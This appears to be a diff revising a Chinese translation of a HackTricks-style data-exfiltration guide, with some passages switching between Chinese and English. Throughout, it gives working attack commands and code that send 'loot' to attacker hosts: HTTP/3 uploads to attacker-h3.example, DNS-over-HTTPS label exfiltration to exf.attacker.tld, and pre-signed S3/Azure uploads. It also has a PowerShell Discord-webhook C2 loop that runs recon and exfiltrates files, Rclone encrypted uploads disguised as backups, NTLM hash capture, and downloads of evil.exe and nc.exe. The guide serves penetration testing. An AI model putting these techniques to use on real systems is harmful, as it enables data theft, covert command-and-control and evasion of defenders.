@@ -1,15 +1,17 @@
 # 数据外泄
 
+{{#include ../banners/hacktricks-training.md}}
+
 > [!TIP]
-> 如需了解一个端到端示例：将 loot 暂存到 `C:\Users\Public`，然后使用 Rclone 进行外泄以模拟合法备份，请查看下面的工作流。
+> 如需查看一个端到端示例，了解如何将 loot 暂存到 `C:\Users\Public`，并使用 Rclone 进行 exfiltration 以模拟合法备份，请参阅以下工作流。
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## 常见的允许外泄信息的域名
+## 常见的可用于 exfiltrate 信息的白名单域名
 
-查看 [https://lots-project.com/](https://lots-project.com/)，查找可被滥用的常见 allowlist 域名
+访问 [https://lots-project.com/](https://lots-project.com/)，查找可被滥用的常见白名单域名
 
 ## 复制\&粘贴 Base64
 
@@ -49,9 +51,9 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
 ### 上传文件
 
-- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
+- [**带文件上传功能的 SimpleHttpServer**](https://gist.github.com/UniIsland/3346170)
+- [**打印 GET 和 POST 请求（包括 headers）的 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python 模块 [uploadserver](https://pypi.org/project/uploadserver/)：
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -64,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS 服务器**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,7 +109,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ### HTTP/3 / QUIC
 
-如果出口控制针对经典的 **TCP/443** 检查进行了调优，但对 **UDP/443** 较为宽松，强制使用 **HTTP/3** 可以将传输切换到 **QUIC**，而不是基于 TCP 的 TLS。攻击者端点需要原生 **HTTP/3** 支持（例如已通过 `Alt-Svc: h3` 宣告支持的反向代理或上传端点）。
+如果出口控制针对经典的 **TCP/443** 检查进行了调整，但对 **UDP/443** 的限制较为宽松，那么强制使用 **HTTP/3** 可将传输切换到 **QUIC**，而不是基于 TCP 的 TLS。攻击者端点需要原生支持 HTTP/3（例如已通过 `Alt-Svc: h3` 宣告支持的 reverse proxy 或 upload endpoint）。
 ```bash
 # Strict: fail if QUIC/H3 is not available
 curl --http3-only -T loot.7z https://attacker-h3.example/upload
@@ -119,11 +121,11 @@ curl --http3 -T loot.7z https://attacker-h3.example/upload
 curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
-一篇 2025 年的研究论文（QUIC-Exfil）发现，QUIC 的加密 headers 和动态地址变更会使 firewall-level 检测 exfiltration 比基于 TLS 或 DNS 的 channel 更困难，并展示了一种 server-preferred-address 方法，将 exfiltration 伪装成 server-side connection migration。<sup>[[9]](#references)</sup>
+一篇 2025 年的研究论文（QUIC-Exfil）发现，QUIC 的加密 headers 和动态地址变更，会使 firewall-level detection of exfiltration 比基于 TLS 或 DNS 的 channels 更加困难；该论文还演示了一种 server-preferred-address 方法，将 exfiltration 伪装成 server-side connection migration。<sup>[[9]](#references)</sup>
 
-### Pre-signed / delegated object-storage 上传
+### Pre-signed / delegated object-storage uploads
 
-当你可以创建或获取一个短期有效的 **signed URL** 时，victim 只需要一个普通的 HTTPS client。这避免了在主机上安装 cloud SDK 或保存长期有效的 credentials。<sup>[[8]](#references)</sup> 这也可以融入常见的 object-storage traffic。
+当你可以创建或获取一个短期有效的 **signed URL** 时，victim 只需要使用普通的 HTTPS client。这样无需在主机上安装 cloud SDK 或保存长期有效的 credentials。<sup>[[8]](#references)</sup> 这也可以融入常见的 object-storage traffic。
 
 **Linux / macOS（AWS S3 pre-signed `PUT`）**
 ```bash
@@ -144,14 +146,15 @@ curl -X PUT --data-binary @loot.7z \
 -H 'Content-Type: application/octet-stream' \
 'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
 ```
+备注：
 - Pre-signed URLs / SAS tokens 通常会限定 **path**、**HTTP method** 和 **expiration**。<sup>[[8]](#references)[[10]](#references)</sup>
-- 对于 Azure Blob `Put Blob`，必须使用 `x-ms-blob-type: BlockBlob`。<sup>[[10]](#references)</sup>
-- 此模式非常适合配合 `curl`、`Invoke-WebRequest` 使用，或用于任何能够发出原始 HTTPS `PUT` 请求的自定义 implant。
+- 对于 Azure Blob `Put Blob`，`x-ms-blob-type: BlockBlob` 是必需的。<sup>[[10]](#references)</sup>
+- 此模式非常适合与 `curl`、`Invoke-WebRequest` 或任何能够发起原始 HTTPS `PUT` 请求的自定义 implant 配合使用。
 
 ### goshs
 
 [goshs](https://github.com/patrickhener/goshs) 是 `python3 -m http.server` 的单二进制替代方案。<sup>[[4]](#references)</sup>
-它支持 upload、download、WebDAV、SFTP、SMB、TLS、authentication、share links，以及 OOB collaboration 功能（DNS、SMTP、NTLM hash capture）。<sup>[[4]](#references)</sup>
+它支持 upload、download、WebDAV、SFTP、SMB、TLS、authentication、share links，以及 OOB 协作功能（DNS、SMTP、NTLM hash capture）。<sup>[[4]](#references)</sup>
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -182,12 +185,12 @@ goshs -tunnel
 ```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks 是只写入的 HTTPS endpoints，可接受 JSON 和可选的文件部分。它们通常被允许访问受信任的 SaaS 域名，且不需要 OAuth/API keys，因此适合用于低摩擦 beaconing 和 exfiltration。<sup>[[5]](#references)[[6]](#references)</sup>
+Webhooks 是仅写入的 HTTPS 端点，可接受 JSON 和可选的文件部分。它们通常被允许访问受信任的 SaaS 域名，且不需要 OAuth/API keys，因此适用于低摩擦的 beaconing 和 exfiltration。<sup>[[5]](#references)[[6]](#references)</sup>
 
 关键思路：
-- Endpoint：Discord 使用 https://discord.com/api/webhooks/<id>/<token>
-- 使用 POST multipart/form-data，并包含一个名为 payload_json 的部分，其中含有 {"content":"..."}，以及可选的、名为 file 的文件部分。
-- Operator loop 模式：定期 beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK 表示交付成功。
+- Endpoint: Discord 使用 https://discord.com/api/webhooks/<id>/<token>
+- 使用 POST multipart/form-data，并包含一个名为 payload_json 的部分，其中包含 {"content":"..."}，以及可选的、名为 file 的文件部分。
+- Operator loop pattern：定期 beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK 表示交付成功。
 
 PowerShell PoC (Discord)：
 ```powershell
@@ -257,21 +260,21 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-备注：
-- 类似模式也适用于使用 incoming webhooks 的其他协作平台（Slack/Teams）；请相应调整 URL 和 JSON schema。
-- 有关 Discord Desktop cache artifacts 以及 webhook/API recovery 的 DFIR，请参阅下面的相关页面。<sup>[[7]](#references)</sup>
+Notes:
+- Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see the related page below.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
-## Rclone（云/对象存储 exfiltration）
+## Rclone (cloud/object-storage exfiltration)
 
-现代 operator 通常会**在本地暂存 loot**，然后使用 [Rclone](https://rclone.org/)，使传输看起来像普通的 backup 或 sync job。一个实用模式是：
+Modern operators often **locally stage loot** and then use [Rclone](https://rclone.org/) to make the transfer look like a normal backup or sync job. A practical pattern is:
 
-1. 一个常规 remote（`s3`、`webdav`、`drive`、`mega`……）
-2. 一个 `crypt` wrapper，使**contents 和 filenames 在 client-side 加密**
-3. 如果 provider 强制限制 object-size，或希望使用更小的 upload units，可选用 `chunker` wrapper
+1. A normal remote (`s3`, `webdav`, `drive`, `mega`, ...)
+2. A `crypt` wrapper so **contents and filenames are encrypted client-side**
+3. An optional `chunker` wrapper if the provider enforces object-size limits or you want smaller upload units
 ```bash
 # 1) Create the storage backend remote (interactive)
 rclone config              # ex: remote
@@ -287,11 +290,11 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 --transfers 2 --checkers 2 --bwlimit 4M
 # If you created the chunker wrapper, upload to overlay:... instead
 ```
-Notes:
-- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
-- `chunker` transparently splits large files and reassembles them on download.<sup>[[11]](#references)</sup>
-- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection.<sup>[[3]](#references)</sup> 对于短时操作，优先使用专用的临时配置，并在之后将其删除。如果必须保留更长时间，优先使用加密的配置处理方式（`RCLONE_CONFIG_PASS` / `--password-command`），而不是将未加密的 `rclone.conf` 留在磁盘上。<sup>[[11]](#references)</sup>
-- 如果目标系统已经同步 **OneDrive**、**Google Drive** 或 **Dropbox**，将 loot 复制到同步目录中，即可借助已经获批的客户端，而无需再放置新的传输 binary。
+笔记：
+- `crypt` 可以加密文件内容和文件名。<sup>[[3]](#references)</sup>
+- `chunker` 会透明地拆分大文件，并在下载时重新组装。<sup>[[11]](#references)</sup>
+- `rclone.conf` 以**混淆**形式存储 `crypt` secrets，并不提供强大的静态数据保护。<sup>[[3]](#references)</sup> 对于短期操作，优先使用专用的临时配置，并在之后将其删除。如果必须保留更长时间，优先使用加密的配置处理方式（`RCLONE_CONFIG_PASS` / `--password-command`），而不是将未加密的 `rclone.conf` 留在磁盘上。<sup>[[11]](#references)</sup>
+- 如果目标已经同步 **OneDrive**、**Google Drive** 或 **Dropbox**，可以将 loot 复制到同步目录中，借助已经获批准的客户端，而不必再放置新的传输 binary。
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
@@ -304,12 +307,12 @@ Notes:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP 服务器（NodeJS）
+### FTP 服务器 (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP 服务器（pure-ftp）
+### FTP 服务器 (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -347,7 +350,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-或者使用 **samba** 创建一个 smb share：
+或者创建一个 smb share，**using samba**：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -371,7 +374,7 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) 是一种单二进制替代方案，可通过 SMB 提供文件，并捕获连接客户端的 NTLM hashes。<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) 是一种单二进制替代工具，可通过 SMB 提供文件服务，并捕获连接客户端的 NTLM hashes。<sup>[[4]](#references)</sup>
 ```bash
 # Start SMB server with NTLM hash capture
 goshs -smb -smb-domain CORP
@@ -387,7 +390,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-如果受害者拥有 SSH，攻击者可以将受害者上的目录挂载到攻击者一侧。
+如果受害者启用了 SSH，攻击者可以将受害者上的目录挂载到攻击者一侧。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -434,7 +437,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## DNS over HTTPS (DoH)
 
-如果经典的 UDP/53 DNS 流量过于嘈杂或遭到阻断，但出站 HTTPS 通常被允许，则可以将常见的 DNS-label exfiltration 模式封装在发送到公共 resolver 的 **DoH** 请求中。将每个 label 控制在远低于 63 字节的范围内，并使用 Base32 等 DNS-safe 字符集。
+如果经典的 UDP/53 DNS 流量过于显眼或被阻断，但出站 HTTPS 通常被允许，则可以将常见的 DNS 标签数据外泄模式封装在发往公共 resolver 的 **DoH** 请求中。将每个标签的长度保持在远低于 63 字节，并使用 Base32 等 DNS 安全字符集。
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
 base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
@@ -445,41 +448,41 @@ curl --http2 -s \
 >/dev/null
 done
 ```
-在 `exf.attacker.tld` 的权威 DNS 服务器上，按数字前缀对查询进行排序，并重构 Base32 数据流。这样可以让传输通过 HTTPS 进入 resolver，而不是使用传统的 UDP/53 DNS。<sup>[[2]](#references)</sup>
+在 `exf.attacker.tld` 的权威 DNS server 上，按数字前缀对查询进行排序，并重构 Base32 stream。这样可以让传输通过 HTTPS 进入 resolver，而不是使用经典的 UDP/53 DNS。<sup>[[2]](#references)</sup>
 
-如需完整的双向 DNS tunnel 工具（`iodine`、`dnscat2` 等），请查看[隧道页面](tunneling-and-port-forwarding.md)。
+对于完整的双向 DNS tunnel tooling（`iodine`、`dnscat2` 等），请查看[隧道页面](tunneling-and-port-forwarding.md)。
 
 ## **SMTP**
 
-如果你可以向 SMTP 服务器发送数据，就可以使用 python 创建一个 SMTP 服务器来接收数据：
+如果你可以向 SMTP server 发送数据，就可以使用 Python 创建一个 SMTP server 来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) 可以快速启动 SMTP server，用于在 OOB exfiltration 场景中捕获 email callbacks。<sup>[[4]](#references)</sup>
+[goshs](https://github.com/patrickhener/goshs) 可以快速启动一个 SMTP server，用于在 OOB exfiltration 场景中捕获 email callbacks。<sup>[[4]](#references)</sup>
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
 收到的 emails 和 callbacks 会直接显示在终端输出中。  
-可与 DNS callback server 结合，以实现完整的 OOB 覆盖：
+可与 DNS callback server 结合使用，以实现完整的 OOB 覆盖：
 ```bash
 # DNS + SMTP combined
 goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-默认情况下，XP 和 2003 中已启用（在其他系统中，需要在安装期间显式添加）
+在 XP 和 2003 中默认启用（在其他系统中，需要在安装期间显式添加）
 
-在 Kali 中，**启动 TFTP server**：
+在 Kali 中，**启动 TFTP 服务器**：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Python 中的 TFTP 服务器：**
+**Python 中的 TFTP server：**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -532,22 +535,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 程序不仅可以检查二进制文件，还具备**根据十六进制重建二进制文件的能力**。这意味着，只要提供二进制文件的十六进制内容，`debug.exe` 就可以生成该二进制文件。不过需要注意，debug.exe **只能汇编大小不超过 64 kb 的文件**。<sup>[[1]](#references)</sup>
+`debug.exe` 程序不仅允许检查二进制文件，还具备**根据十六进制内容重建二进制文件的能力**。这意味着，通过提供二进制文件的十六进制内容，`debug.exe` 可以生成该二进制文件。不过，需要注意的是，debug.exe **只能汇编大小不超过 64 kb 的文件**。<sup>[[1]](#references)</sup>
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-然后将文本复制粘贴到 windows-shell 中，随后会创建一个名为 nc.exe 的文件。
+然后将文本复制粘贴到 windows-shell 中，之后会创建一个名为 nc.exe 的文件。
 
 ## References
 
-- [1] [向 Windows 传输文件](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [1] [将文件传输到 Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 - [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
-- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [3] [Rclone `crypt` 后端](https://rclone.org/crypt/)
 - [4] [goshs](https://github.com/patrickhener/goshs)
 - [5] [将 Discord 作为 C2 以及遗留在其后的缓存证据](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [6] [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [6] [Discord Webhooks – 执行 Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [7] [Discord Forensic Suite（缓存解析器）](https://github.com/jwdfir/discord_cache_parser)
 - [8] [使用预签名 URL 上传对象 - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
 - [9] [QUIC-Exfil：利用 QUIC 的 Server Preferred Address 功能执行数据外泄攻击](https://arxiv.org/abs/2505.05292)
